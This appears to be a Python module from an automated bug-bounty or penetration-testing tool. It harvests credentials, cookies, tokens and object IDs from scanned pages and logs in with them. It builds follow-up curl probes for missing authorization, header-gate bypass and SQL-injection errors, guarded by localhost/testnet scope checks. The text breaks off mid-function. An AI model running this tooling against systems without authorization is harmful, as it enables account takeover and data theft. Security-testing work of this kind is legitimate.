# LAYER: think
# DEST: vortex
# ENDPOINTS: harvest_text, harvest_recon_dir, harvest_reframes, harvest_login_once, followups_for_verdict, authed_recon, fuzz_object_ids, confirm_form_replay  # noqa: E501
# TOPICS: none
"""oracle_harvest.py — credential/ID/session harvest + data-driven reframes.

Op2 extension (Mind That Does Not Wait): where REFRAME_TRANSFORMS mutate
checks blindly, the harvester reads the wire first — creds, IDs, cookies,
tokens, login forms — then emits reframes that USE what was found. Login
is performed at harvest time (a scoped walker, not a check), so emitted
checks stay single-command: authed replays ride captured sessions.

Flow:
  wire bodies → harvest_text/harvest_recon_dir → corpus
  corpus forms + creds → harvest_login_once → session cookie (cached)
  corpus + session → harvest_reframes → bounded follow-up cards

Bounds (deterministic, first-seen order): files, bytes, creds, IDs,
login flows, and cards are all capped. No corpus evidence → no login
attempts, no reframes. POST permission: localhost targets always, live
targets only under --testnet.
"""

from __future__ import annotations

import base64
import http.cookiejar
import json
import os
import re
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from oracle_foundation import (
    SQLI_ERROR_MARKERS,
    build_seam_card,
    grade_strength,
    reframe_a_source,
)

MAX_FILES = 20
MAX_BYTES = 200_000
MAX_CREDS = 5
MAX_IDS = 20
MAX_COOKIES = 10
MAX_TOKENS = 5
MAX_FORMS = 5
MAX_LOGIN_FLOWS = 4
MAX_CARDS = 8
MAX_WALK_STEPS = 8
MAX_LINKS = 30
MAX_AUTHD_URLS = 30
FUZZ_SPAN = 500
FUZZ_CONSECUTIVE_ABORT = 10

_LOCAL_HOSTS = ("localhost", "127.0.0.1", "::1")

_COMMENT_RE = re.compile(r"<!--(.*?)-->", re.DOTALL)
_PAIR_RE = re.compile(
    r"([A-Za-z0-9_.@+-]{2,64})\s*:\s*([A-Za-z0-9!@#$%^&*_.+-]{2,64})"
)  # noqa: E501
_CRED_KEY_RE = re.compile(
    r"user|login|name|account|admin|test|email", re.IGNORECASE
)  # noqa: E501
_JSON_USER_RE = re.compile(
    r"""["']?((?:user|login|email|account)\w*)["']?\s*[:=]\s*["']([^"'<>]{1,64})["']""",  # noqa: E501
    re.IGNORECASE,
)
_JSON_PASS_RE = re.compile(
    r"""["']?((?:pass|pwd)\w*)["']?\s*[:=]\s*["']([^"'<>]{1,64})["']""",
    re.IGNORECASE,
)
_ID_RE = re.compile(r"[/=?&#](\d{1,9})(?=[/&#\"'\s]|$)")
_JSON_ID_RE = re.compile(r'"id"\s*:\s*(\d{1,9})')
_SETCOOKIE_RE = re.compile(
    r"Set-Cookie:\s*([^=;\s,]+)=([^;\s]*)", re.IGNORECASE
)  # noqa: E501
_DOC_COOKIE_RE = re.compile(
    r"document\.cookie\s*=\s*[\"']([^=;\"']+)=([^;\"']*)", re.IGNORECASE
)
_JWT_RE = re.compile(
    r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*"
)  # noqa: E501
_BEARER_RE = re.compile(r"Bearer\s+([A-Za-z0-9._~+/-]{8,512})")
_FORM_RE = re.compile(
    r"<form\b([^>]*)>(.*?)</form>", re.IGNORECASE | re.DOTALL
)  # noqa: E501
_ACTION_RE = re.compile(r"""action\s*=\s*["']([^"']*)["']""", re.IGNORECASE)
_INPUT_NAME_RE = re.compile(r"""name\s*=\s*["']([^"']+)["']""", re.IGNORECASE)
_HIDDEN_RE = re.compile(
    r"""<input\b[^>]*type\s*=\s*["']hidden["'][^>]*>""", re.IGNORECASE
)
_VALUE_RE = re.compile(r"""value\s*=\s*["']([^"']*)["']""", re.IGNORECASE)
_USER_FIELD_RE = re.compile(r"user|login|email|account", re.IGNORECASE)
_PASS_FIELD_RE = re.compile(r"pass|pwd|secret", re.IGNORECASE)
_URL_RE = re.compile(r"https?://[^\s'\"]+")
_HREF_RE = re.compile(r"""(?:href|src)\s*=\s*["']([^"'#]+)["']""", re.I)
# Self-describing gate: the page names the header value it requires
# ("Only admin.localhost:8000 can access, Your X-Host is None").
# The required value + header name are replayed verbatim — no dictionary.
_GATE_REQUIRE_RE = re.compile(r"Only\s+(\S{1,200}?)\s+can\s+access", re.IGNORECASE)
_GATE_CURRENT_RE = re.compile(
    r"Your\s+([A-Za-z][A-Za-z0-9-]{1,40})\s+is\s+(\S{1,200})",
    re.IGNORECASE,
)
# Conservative value charset: harvested strings are app-controlled, so the
# replay value must survive single-quote wrapping and the check sanitizer.
# No quotes, whitespace, or shell metachars — host/token-shaped only.
_GATE_VALUE_RE = re.compile(r"[A-Za-z0-9_.:~/=-]{1,200}\Z")
MAX_GATE_HINTS = 4
# General form fill (harvest-form reframe): every named <input> with its
# type + default value. Separate from the login-form corpus (_parse_form),
# which only keeps user/pass/hidden fields for harvest_login_once.
_INPUT_TAG_RE = re.compile(r"<input\b([^>]*)>", re.IGNORECASE)
_INPUT_TYPE_RE = re.compile(r"""type\s*=\s*["']([^"']*)["']""", re.IGNORECASE)
_METHOD_RE = re.compile(r"""method\s*=\s*["']([^"']*)["']""", re.IGNORECASE)
_FILLABLE_TYPES = frozenset({"", "text", "search", "number", "password", "url", "tel"})
_CARRY_TYPES = frozenset({"hidden", "submit", "button", "image"})
_FIELD_NAME_RE = re.compile(r"[A-Za-z][A-Za-z0-9_.\-]{0,64}\Z")
# Parent payloads are template-encoded (%27...); only query-safe chars may
# ride into the replay URL unencoded. Anything else fails closed.
_QUERY_SAFE_RE = re.compile(r"[A-Za-z0-9_.~%+=/:\-]*\Z")
MAX_FILL_FORMS = 4


def _blank() -> Dict[str, Any]:
    return {
        "creds": [],
        "ids": [],
        "cookies": [],
        "tokens": [],
        "forms": [],
        "links": [],
        "gate_hints": [],
        "fill_forms": [],
    }


def _fill_forms_in(text: str, source_url: str) -> List[Dict[str, Any]]:
    """General forms: action + method + every named input (type, value).

    Powers the harvest-form reframe (probe replay through the page's own
    form, e.g. DVWA ?id= gated on Submit). v1 covers GET forms; POST
    forms are harvested but not replayed (single-shot replay cannot do
    the POST-then-re-GET two-step most stored sinks need).
    """
    found: List[Dict[str, Any]] = []
    for attrs, inner in _FORM_RE.findall(text):
        m = _ACTION_RE.search(attrs)
        action = m.group(1).strip() if m else ""
        if action:
            if source_url:
                action = urllib.parse.urljoin(source_url, action).split("#", 1)[0]
            elif not action.startswith(("http://", "https://")):
                continue
        else:
            action = (source_url or "").split("#", 1)[0]
        if not action or not action.startswith(("http://", "https://")):
            continue
        mm = _METHOD_RE.search(attrs)
        method = (mm.group(1).strip().upper() if mm else "GET") or "GET"
        fields: List[Tuple[str, str, str]] = []
        for tag in _INPUT_TAG_RE.findall(inner):
            nm = _INPUT_NAME_RE.search(tag)
            if not nm or not _FIELD_NAME_RE.match(nm.group(1)):
                continue
            tm = _INPUT_TYPE_RE.search(tag)
            ftype = (tm.group(1).strip().lower() if tm else "") or ""
            vm = _VALUE_RE.search(tag)
            value = vm.group(1) if vm else ""
            fields.append((nm.group(1), ftype, value))
        if not fields:
            continue
        hint = {"action": action, "method": method, "fields": fields}
        if hint not in found:
            found.append(hint)
    return found


def _form_replay_url(check: str, hint: Dict[str, Any]) -> Optional[Tuple[str, str]]:
    """(replay URL, injected field) carrying the parent probe, else None.

    Parent must be a single-param GET probe (?name=payload); the payload
    fills the same-named (else first) fillable input, and carried fields
    (hidden/submit/button) ride with their page defaults — the gate the
    bare probe was missing (DVWA Submit). Fails closed on POST forms,
    off-host actions, multi-param parents, and unsafe payload chars.
    """
    if re.search(r"(?:^|\s)(?:-X\s+(?!GET\b)\S+|-d\b|--data)", check):
        return None
    mu = re.search(r"'(https?://[^']+)'", check)
    if not mu:
        return None
    parent_url = mu.group(1)
    query = parent_url.split("?", 1)[1] if "?" in parent_url else ""
    if "&" in query:
        return None
    if not query or "=" not in query:
        return None
    pname, _, pval = query.partition("=")
    pname = pname.strip()
    if not _FIELD_NAME_RE.match(pname) or not _QUERY_SAFE_RE.match(pval):
        return None
    if (hint.get("method") or "GET").upper() != "GET":
        return None
    action = str(hint.get("action", ""))
    try:
        if urllib.parse.urlsplit(action).netloc.lower() != (
            urllib.parse.urlsplit(parent_url).netloc.lower()
        ):
            return None
    except ValueError:
        return None
    fields = [(n, t, v) for n, t, v in hint.get("fields", [])]
    fillable = [n for n, t, _ in fields if t in _FILLABLE_TYPES]
    if not fillable:
        return None
    target = pname if pname in fillable else fillable[0]
    parts: List[str] = []
    for n, t, v in fields:
        if n == target:
            parts.append(f"{n}={pval}")
        elif t in _CARRY_TYPES:
            default = v if v else n
            parts.append(f"{n}={urllib.parse.quote(default, safe='')[:200]}")
    if not parts:
        return None
    replay_url = action.split("?", 1)[0] + "?" + "&".join(parts)
    # Replay-to-itself carries no new information (a lone input that IS the
    # parent's param). But a single-field replay that RENAMES the param
    # (?q= → ?name=) is genuine discovery: the page named its input and the
    # parent guessed wrong. (DVWA xss_r: the submit is nameless, so browsers
    # send ?name= alone — no gate field exists to carry.)
    if replay_url == parent_url:
        return None
    return replay_url, target


def _gate_hints_in(text: str) -> List[Tuple[str, str]]:
    """(header, required_value) pairs from self-describing gate messages.

    Both halves must appear in the SAME body: what the gate requires
    ("Only <value> can access") and what it saw ("Your <Header> is
    <current>"). Skipped when required == current (nothing to replay)
    or when either half fails the conservative shape checks.
    """
    found: List[Tuple[str, str]] = []
    requires = _GATE_REQUIRE_RE.findall(text)
    currents = _GATE_CURRENT_RE.findall(text)
    if not requires or not currents:
        return found
    for req in requires:
        value = req.split("<", 1)[0].rstrip(".,;:!?")
        if not _GATE_VALUE_RE.match(value):
            continue
        for header, current in currents:
            if value == current.split("<", 1)[0]:
                continue
            pair = (header, value)
            if pair not in found:
                found.append(pair)
    return found


def _take(seq: List, item: Any, cap: int) -> None:
    if item not in seq and len(seq) < cap:
        seq.append(item)


def _form_key(form: Dict) -> Tuple[str, str, str]:
    return (form["action"], form["user_field"], form["pass_field"])


def harvest_text(body: str, source_url: str = "") -> Dict[str, Any]:
    """Extract creds, IDs, cookies, tokens, and login forms from one body.

    Deterministic first-seen order; everything capped. Forms resolve
    their action against source_url ("" action posts back to the page);
    forms with no usable action are dropped.
    """
    out = _blank()
    text = body or ""
    for comment in _COMMENT_RE.findall(text):
        for m in _PAIR_RE.finditer(comment):
            key, val = m.group(1), m.group(2)
            before = comment[m.start() - 1] if m.start() > 0 else ""
            after = comment[m.end()] if m.end() < len(comment) else ""
            bracketed = before in set("([\"'{") or after in set(")]}'\"}")
            if _CRED_KEY_RE.search(key) or bracketed:
                _take(out["creds"], (key, val), MAX_CREDS)
    users = _JSON_USER_RE.findall(text)
    pwds = _JSON_PASS_RE.findall(text)
    if users and pwds:
        _take(out["creds"], (users[0][1], pwds[0][1]), MAX_CREDS)
    for num in _ID_RE.findall(text):
        _take(out["ids"], num, MAX_IDS)
    for num in _JSON_ID_RE.findall(text):
        _take(out["ids"], num, MAX_IDS)
    for name, val in _SETCOOKIE_RE.findall(text):
        if val and val.lower() not in ("deleted", "expired"):
            _take(out["cookies"], (name, val), MAX_COOKIES)
    for name, val in _DOC_COOKIE_RE.findall(text):
        if val:
            _take(out["cookies"], (name, val), MAX_COOKIES)
    for tok in _JWT_RE.findall(text):
        _take(out["tokens"], tok, MAX_TOKENS)
    for tok in _BEARER_RE.findall(text):
        _take(out["tokens"], tok, MAX_TOKENS)
    for link in _HREF_RE.findall(text):
        if source_url:
            absolute = urllib.parse.urljoin(source_url, link)
        else:
            absolute = link
        if absolute.startswith(("http://", "https://")):
            _take(out["links"], absolute, MAX_LINKS)
    for attrs, inner in _FORM_RE.findall(text):
        form = _parse_form(attrs, inner, source_url)
        if form is not None:
            key = _form_key(form)
            seen = [_form_key(f) for f in out["forms"]]
            if key not in seen and len(out["forms"]) < MAX_FORMS:
                out["forms"].append(form)
    for hint in _gate_hints_in(text):
        _take(out["gate_hints"], hint, MAX_GATE_HINTS)
    for form in _fill_forms_in(text, source_url):
        if len(out["fill_forms"]) >= MAX_FILL_FORMS:
            break
        if form not in out["fill_forms"]:
            out["fill_forms"].append(form)
    return out


def _parse_form(attrs: str, inner: str, source_url: str) -> Optional[Dict]:
    names = _INPUT_NAME_RE.findall(inner)
    user_field = next((n for n in names if _USER_FIELD_RE.search(n)), "")
    pass_field = next((n for n in names if _PASS_FIELD_RE.search(n)), "")
    if not user_field and not pass_field:
        return None
    m = _ACTION_RE.search(attrs)
    action = m.group(1).strip() if m else ""
    if action:
        if source_url:
            action = urllib.parse.urljoin(source_url, action)
        elif not action.startswith(("http://", "https://")):
            return None
    else:
        action = source_url
    if not action.startswith(("http://", "https://")):
        return None
    hidden: Dict[str, str] = {}
    for tag in _HIDDEN_RE.findall(inner):
        nm = _INPUT_NAME_RE.search(tag)
        vm = _VALUE_RE.search(tag)
        if nm:
            hidden[nm.group(1)] = vm.group(1) if vm else ""
    return {
        "action": action,
        "page": source_url,
        "user_field": user_field,
        "pass_field": pass_field,
        "hidden": hidden,
    }


def merge_harvest(*parts: Dict[str, Any]) -> Dict[str, Any]:
    """Merge corpora, deduped, first-seen order, caps enforced."""
    out = _blank()
    caps = {
        "creds": MAX_CREDS,
        "ids": MAX_IDS,
        "cookies": MAX_COOKIES,
        "tokens": MAX_TOKENS,
        "links": MAX_LINKS,
        "gate_hints": MAX_GATE_HINTS,
        "fill_forms": MAX_FILL_FORMS,
    }
    for part in parts:
        for key, cap in caps.items():
            for item in part.get(key, []):
                _take(out[key], item, cap)
        for form in part.get("forms", []):
            fkey = _form_key(form)
            seen = [_form_key(f) for f in out["forms"]]
            if fkey not in seen and len(out["forms"]) < MAX_FORMS:
                out["forms"].append(form)
    return out


def harvest_recon_dir(recon_dir: Path) -> Dict[str, Any]:
    """Harvest recon text files plus manifest-mapped asset bodies.

    Asset bodies resolve through assets/_manifest.json (filename → URL)
    so their forms carry usable actions. Unreadable files are skipped;
    the corpus records only what was actually read.
    """
    out = _blank()
    try:
        files = sorted(
            p
            for p in recon_dir.iterdir()
            if p.is_file() and p.suffix in (".txt", ".html", ".js", ".json")
        )
    except OSError:
        files = []
    for path in files[:MAX_FILES]:
        try:
            raw = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        out = merge_harvest(out, harvest_text(raw[:MAX_BYTES]))
    assets = recon_dir.parent / "assets" if recon_dir.name == "recon" else None
    manifest = assets / "_manifest.json" if assets else None
    if manifest is not None and manifest.is_file():
        try:
            mapping = json.loads(manifest.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            mapping = {}
        for fname in sorted(mapping)[:MAX_FILES]:
            fpath = assets / fname
            try:
                raw = fpath.read_text(encoding="utf-8", errors="ignore")
            except OSError:
                continue
            url = str(mapping[fname])
            found = harvest_text(raw[:MAX_BYTES], source_url=url)
            out = merge_harvest(out, found)
    return out


def _first_url(check: str) -> str:
    m = _URL_RE.search(check or "")
    return m.group(0) if m else ""


def _is_local(url: str) -> bool:
    try:
        return (urllib.parse.urlsplit(url).hostname or "") in _LOCAL_HOSTS
    except ValueError:
        return False


class _SameHostRedirect(urllib.request.HTTPRedirectHandler):
    """Follow redirects only when the host does not change."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        old = urllib.parse.urlsplit(req.full_url).hostname or ""
        new = urllib.parse.urlsplit(newurl).hostname or ""
        if not new or new != old:
            return None
        return super().redirect_request(req, fp, code, msg, headers, newurl)


def _fetch(
    opener: Any,
    url: str,
    gate: Any,
    timeout: int = 15,
    data: Any = None,
    extra_headers: Any = None,
) -> Tuple[Optional[int], str, str]:
    """One scoped fetch. Returns (status_or_None, final_url, body)."""
    if not url.startswith(("http://", "https://")):
        return None, url, ""
    if gate is not None:
        try:
            allowed = bool(gate.is_in_scope(url)[0])
        except Exception:
            allowed = False
        if not allowed:
            return None, url, ""
    elif not _is_local(url):
        return None, url, ""
    headers = {"User-Agent": "Oracle-Harvest/1.0", **_attribution_headers()}
    if extra_headers:
        headers.update(extra_headers)
    if data is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=headers)
    try:
        with opener.open(req, timeout=timeout) as resp:
            code = resp.getcode()
            final = resp.geturl()
            body = resp.read(1_000_000).decode("utf-8", errors="ignore")
        return code, final, body
    except urllib.error.HTTPError as e:
        try:
            body = e.read(1_000_000).decode("utf-8", errors="ignore")
        except Exception:
            body = ""
        return e.code, url, body
    except Exception:
        return None, url, ""


def attempt_login_flow(
    page_url: str,
    user_field: str,
    pass_field: str,
    user: str,
    pwd: str,
    *,
    timeout: int = 15,
    gate: Any = None,
) -> Optional[Dict[str, str]]:
    """Walk a login flow: fetch page, submit its forms, keep the session.

    Multi-step flows (username page → password page → session) work
    because each response is re-harvested for the next form. Success is
    cookie appearance: a login that sets session state authenticated.
    A bogus cookie only wastes reframes — verify still decides.
    """
    jar: http.cookiejar.CookieJar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        _SameHostRedirect, urllib.request.HTTPCookieProcessor(jar)
    )
    code, final, body = _fetch(opener, page_url, gate, timeout)
    if code is None:
        return None
    baseline = len(jar)
    tried = set()
    for _ in range(MAX_WALK_STEPS):
        forms = harvest_text(body, source_url=final)["forms"]
        target = None
        for form in forms:
            key = (form["action"], form["user_field"], form["pass_field"])
            if key not in tried:
                target = form
                tried.add(key)
                break
        if target is None:
            break
        payload = dict(target["hidden"])
        if target["user_field"] or user_field:
            payload[target["user_field"] or user_field] = user
        if target["pass_field"] or pass_field:
            payload[target["pass_field"] or pass_field] = pwd
        data = urllib.parse.urlencode(payload).encode("utf-8")
        action = target["action"]
        code, final, body = _fetch(opener, action, gate, timeout, data=data)
        if code is None:
            break
        if len(jar) > baseline:
            return {c.name: c.value for c in jar if c.value}
    return None


def _login_cache_path(recon_dir: Path) -> Path:
    return recon_dir / "harvest_login.json"


def _read_login_cache(recon_dir: Path) -> Optional[Dict[str, str]]:
    try:
        data = json.loads(_login_cache_path(recon_dir).read_text())
    except (OSError, ValueError):
        return None
    if data.get("status") == "ok" and data.get("cookies"):
        return dict(data["cookies"])
    return None


def _write_login_cache(
    recon_dir: Path, ok: bool, cookies: Dict[str, str], user: str
) -> None:
    from datetime import datetime, timezone

    data = {
        "status": "ok" if ok else "failed",
        "cookies": cookies,
        "user": user,
        "ts": datetime.now(timezone.utc).isoformat(),
    }
    path = _login_cache_path(recon_dir)
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w", encoding="utf-8") as fh:
        fh.write(json.dumps(data))
    os.chmod(path, 0o600)


def harvest_login_once(
    base_url: str,
    corpus: Dict[str, Any],
    recon_dir: Path,
    gate: Any = None,
    is_testnet: bool = False,
) -> Optional[Dict[str, str]]:
    """Log in once per hunt with harvested creds; return session cookies.

    Strict gates: no forms or no creds → no attempts. POST permission is
    localhost always, live only under --testnet. Success and terminal
    failure are cached (0600) so a hunt never re-hammers a login.
    """
    cached = _read_login_cache(recon_dir)
    if cached is not None:
        return cached
    try:
        failed = json.loads(_login_cache_path(recon_dir).read_text())
        if failed.get("status") == "failed":
            return None
    except (OSError, ValueError):
        pass
    if not base_url.startswith(("http://", "https://")):
        return None
    if not corpus.get("forms") or not corpus.get("creds"):
        return None
    if not _is_local(base_url) and not is_testnet:
        return None
    pairs: List[Tuple[str, str]] = []
    for form in corpus["forms"][:MAX_FORMS]:
        key = (form["user_field"] or "username", form["pass_field"])
        if key not in pairs and len(pairs) < 2:
            pairs.append(key)
    flows = 0
    for user_field, pass_field in pairs:
        for user, pwd in corpus["creds"][:2]:
            if flows >= MAX_LOGIN_FLOWS:
                break
            flows += 1
            cookies = attempt_login_flow(
                base_url, user_field, pass_field, user, pwd, gate=gate
            )
            if cookies:
                _write_login_cache(recon_dir, True, cookies, user)
                return cookies
    _write_login_cache(recon_dir, False, {}, "")
    return None


def _swap_first_id(check: str, new_id: str) -> Optional[str]:
    """Replace the first numeric path/query segment with new_id.

    Hosts and ports are never touched. Returns None when the check
    carries no swappable digits.
    """
    for url in _URL_RE.findall(check):
        m = re.match(r"(https?://[^/]+)(/.*)?$", url)
        if not m:
            continue
        host, rest = m.group(1), m.group(2) or ""
        swapped, n = re.subn(r"\d+", new_id, rest, count=1)
        if n:
            return check.replace(url, host + swapped, 1)
    return None


def _cookie_suffix(session: Dict[str, str]) -> str:
    joined = "; ".join(f"{k}={v}" for k, v in session.items())
    return f' -H "Cookie: {joined}"'


def _split_id_url(url: str) -> Optional[Tuple[str, str, str]]:
    """Split a URL into (prefix, id, suffix) at its first numeric path
    segment. Hosts and ports are never part of the id. None when the
    URL carries no swappable digits."""
    m = re.match(r"(https?://[^/]+)(/.*)?$", url or "")
    if not m:
        return None
    host, rest = m.group(1), m.group(2) or ""
    d = re.search(r"\d+", rest)
    if not d:
        return None
    start, end = d.start(), d.end()
    return (host + rest[:start], d.group(0), rest[end:])


def _cookie_host_ok(check: str, base_url: str) -> bool:
    """A captured session only rides to the host that issued it."""
    if not base_url:
        return False
    try:
        want = urllib.parse.urlsplit(base_url).hostname or ""
        got = urllib.parse.urlsplit(_first_url(check)).hostname or ""
    except ValueError:
        return False
    return bool(want) and want == got


def _echo_expected(obj_id: str) -> str:
    return f'status 200, body contains "{obj_id}"'


def _echoes(body: str, obj_id: str) -> bool:
    """Standalone-number echo: the rendered object cites its own id,
    not as a substring of a longer digit run."""
    if not obj_id.isdigit():
        return False
    return re.search(r"(?<!\d)%s(?!\d)" % re.escape(obj_id), body) is not None


def harvest_reframes(
    seam: Dict[str, Any],
    corpus: Dict[str, Any],
    session: Dict[str, str],
    next_n: int,
    max_cards: int = MAX_CARDS,
    base_url: str = "",
) -> List[Dict]:
    """Build bounded follow-up cards from harvested material.

    Authed replays ride the captured session; ID swaps retarget the
    check at harvested object IDs (authed first, one unauth control);
    basic/bearer variants probe harvested credentials. Parents that are
    already reframes yield nothing — one round, no loops.
    """
    if seam.get("reframed"):
        return []
    check = str(seam.get("check", ""))
    if not check.lstrip().startswith("curl "):
        return []
    variants: List[Tuple[str, str, str, str]] = []
    has_cookie = "cookie" in check.lower() or " -b " in check
    has_auth = "authorization" in check.lower() or " -u " in check
    cookie_ok = bool(session) and _cookie_host_ok(check, base_url)
    cookie_ok = cookie_ok and not has_cookie and not has_auth
    parent_b = str(seam.get("assertion_b", ""))
    parent_e = str(seam.get("expected", ""))
    if cookie_ok:
        variants.append(
            (
                "harvest-auth",
                check + _cookie_suffix(session),
                parent_e,
                f"Harvested premise (harvest-auth): {parent_b}",
            )
        )
    # Self-describing gate replay: the rejected page named the header value
    # it requires. Replay it verbatim (p14: pygoat /secret X-Host gate).
    # First so page-specific signal beats generic id/cred variants at the cap.
    for header, value in corpus.get("gate_hints", [])[:2]:
        if f"{header.lower()}:" in check.lower():
            continue
        replay = check + f" -H '{header}: {value}'"
        if cookie_ok:
            replay += _cookie_suffix(session)
        variants.append(
            (
                "harvest-gate",
                replay,
                parent_e,
                f"Page names its gate ({header} must be {value}) — "
                f"replaying the stated access rule: {parent_b}",
            )
        )
    # Form-gated replay: the bare probe missed the form's gate fields
    # (DVWA ?id= without Submit never reaches the query). Carry the probe
    # payload through the page's own form, defaults included.
    for hint in corpus.get("fill_forms", [])[:2]:
        built = _form_replay_url(check, hint)
        if not built:
            continue
        replay_url, target = built
        replay = re.sub(
            r"'(https?://[^']+)'",
            f"'{replay_url}'",
            check,
            count=1,
        )
        if cookie_ok:
            replay += _cookie_suffix(session)
        fields = ",".join(n for n, _, _ in hint.get("fields", []))
        variants.append(
            (
                "harvest-form",
                replay,
                parent_e,
                f"Form gates this endpoint ({fields}) — replaying the probe "
                f"through the page's own form: {parent_b}",
            )
        )
        # Minimal error trigger for sqli parents: the parent payload is a
        # tautology (' OR '1'='1') — VALID sql that returns rows instead of
        # erroring. A bare quote in the SAME field through the same gate
        # is the error probe (DVWA: only unbalanced quotes reach
        # "error in your SQL syntax"). In-band expected: form actions
        # re-render the page (200+text); the inherit variant above keeps
        # covering unhandled-500 sinks.
        if str(seam.get("claim_type", "")) == "injection-sqli-probe":
            err_url = re.sub(
                rf"([?&]){re.escape(target)}=[^&#]*",
                r"\1" + target + "=%27",
                replay_url,
                count=1,
            )
            if err_url != replay_url:
                err_replay = re.sub(
                    r"'(https?://[^']+)'",
                    f"'{err_url}'",
                    check,
                    count=1,
                )
                if cookie_ok:
                    err_replay += _cookie_suffix(session)
                variants.append(
                    (
                        "harvest-form",
                        err_replay,
                        "status 200, body contains any of " + SQLI_ERROR_MARKERS,
                        f"Form gates this endpoint ({fields}) — minimal "
                        f"error trigger (bare quote) through the same "
                        f"gate: {parent_b}",
                    )
                )
    in_check = set(re.findall(r"\d+", check))
    fresh_ids = [i for i in corpus.get("ids", []) if i not in in_check]
    for num in fresh_ids[:4]:
        swapped = _swap_first_id(check, num)
        if swapped is None:
            continue
        if cookie_ok:
            variants.append(
                (
                    "harvest-id",
                    swapped + _cookie_suffix(session),
                    _echo_expected(num),
                    f"Authed session reads object {num} (ownership unchecked)",
                )
            )
        else:
            variants.append(
                (
                    "harvest-id",
                    swapped,
                    _echo_expected(num),
                    f"Object {num} readable without session (missing auth)",
                )
            )
    if cookie_ok and fresh_ids:
        fid = fresh_ids[0]
        first = _swap_first_id(check, fid)
        if first is not None:
            variants.append(
                (
                    "harvest-id",
                    first,
                    _echo_expected(fid),
                    f"Object {fid} readable without session (missing auth)",
                )
            )
    if base_url:
        try:
            home = urllib.parse.urlsplit(base_url).hostname or ""
        except ValueError:
            home = ""
        seen_links = 0
        for link in corpus.get("links", []):
            if seen_links >= 3:
                break
            try:
                same = urllib.parse.urlsplit(link).hostname == home
            except ValueError:
                continue
            if not home or not same:
                continue
            parts = _split_id_url(link)
            if parts is None:
                continue
            seen_links += 1
            obj_id = parts[1]
            path = urllib.parse.urlsplit(link).path
            probe = f"curl -s {link}"
            if cookie_ok:
                probe += _cookie_suffix(session)
            variants.append(
                (
                    "harvest-link",
                    probe,
                    _echo_expected(obj_id),
                    f"Authed session reads {path} (ownership unchecked)",
                )
            )
    if not has_auth:
        for user, pwd in corpus.get("creds", [])[:2]:
            raw = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            variants.append(
                (
                    "harvest-basic",
                    check + f' -H "Authorization: Basic {raw}"',
                    parent_e,
                    f"Harvested premise (harvest-basic): {parent_b}",
                )
            )
        for tok in corpus.get("tokens", [])[:2]:
            variants.append(
                (
                    "harvest-token",
                    check + f' -H "Authorization: Bearer {tok}"',
                    parent_e,
                    f"Harvested premise (harvest-token): {parent_b}",
                )
            )
    cards: List[Dict] = []
    for name, new_check, expected, blurb in variants[:max_cards]:
        try:
            cards.append(
                build_seam_card(
                    n=next_n + len(cards),
                    assertion_a=str(seam.get("assertion_a", "")),
                    assertion_a_source=reframe_a_source(seam),
                    assertion_b=blurb,
                    check=new_check,
                    expected=expected,
                    impact=seam.get("impact", ""),
                    origin="harvest",
                    mindset="seam",
                    reframed=True,
                    reframe_of=seam.get("n"),
                    reframe_transform=name,
                )
            )
        except ValueError:
            continue
    return cards


def _recon_urls(recon_dir: Path) -> List[str]:
    """Known URLs from recon host/path files (fuzz tags tolerated)."""
    urls: List[str] = []
    for name in (
        "fuzzed_paths.txt",
        "live_hosts.txt",
        "known_urls.txt",
        "js_endpoints.txt",
    ):
        path = recon_dir / name
        if not path.is_file():
            continue
        try:
            lines = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        for line in lines.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            for tok in re.findall(r"https?://[^\s'\"<>`]+", line):
                if tok not in urls and len(urls) < MAX_AUTHD_URLS:
                    urls.append(tok)
    return urls


def _authed_cache_path(recon_dir: Path) -> Path:
    return recon_dir / "authed_corpus.json"



def _attribution_headers() -> Dict[str, str]:
    """Program-attribution header (H1 BBP law, tinder 2026-10-21): every
    testing request carries ``x-hackerone: <username>`` when the env is
    set. Empty dict otherwise — no header, no crash, no claim.
    """
    user = (os.environ.get("HACKERONE_USERNAME") or "").strip()
    if re.fullmatch(r"[A-Za-z0-9_-]{1,48}", user or ""):
        return {"x-hackerone": user}
    return {}

def _fuzz_cache_path(recon_dir: Path) -> Path:
    return recon_dir / "id_fuzz.json"


def authed_recon(
    session: Dict[str, str],
    base_url: str,
    recon_dir: Path,
    gate: Any = None,
) -> Dict[str, Any]:
    """Re-fetch known session-host URLs with the session; harvest bodies.

    Cached per hunt. The session only rides to the host that issued it;
    every fetch still passes the scope gate. GET-only: safe anywhere
    in scope, no --testnet needed.
    """
    if not session or not base_url:
        return _blank()
    try:
        cached = json.loads(_authed_cache_path(recon_dir).read_text())
        if isinstance(cached.get("corpus"), dict):
            return cached["corpus"]
    except (OSError, ValueError):
        pass
    try:
        home = urllib.parse.urlsplit(base_url).hostname or ""
    except ValueError:
        return _blank()
    if not home:
        return _blank()
    opener = urllib.request.build_opener(_SameHostRedirect)
    cookie = "; ".join(f"{k}={v}" for k, v in session.items())
    headers = {"Cookie": cookie}
    out = _blank()
    for url in _recon_urls(recon_dir):
        try:
            if urllib.parse.urlsplit(url).hostname != home:
                continue
        except ValueError:
            continue
        code, final, body = _fetch(
            opener,
            url,
            gate,
            timeout=10,
            extra_headers=headers,
        )
        if code is None or not body:
            continue
        out = merge_harvest(out, harvest_text(body, source_url=final))
    try:
        _authed_cache_path(recon_dir).write_text(json.dumps({"corpus": out}))
    except OSError:
        pass
    return out


def _pick_fuzz_target(
    check: str,
    corpus: Dict[str, Any],
) -> Optional[Tuple[str, str]]:
    """First fuzzable (full_url, center_id): the check's own URL, else the
    first harvested link with a numeric path segment."""
    cands = []
    first = _first_url(check)
    if first:
        cands.append(first)
    cands.extend(corpus.get("links", []))
    for url in cands:
        parts = _split_id_url(url)
        if parts is not None:
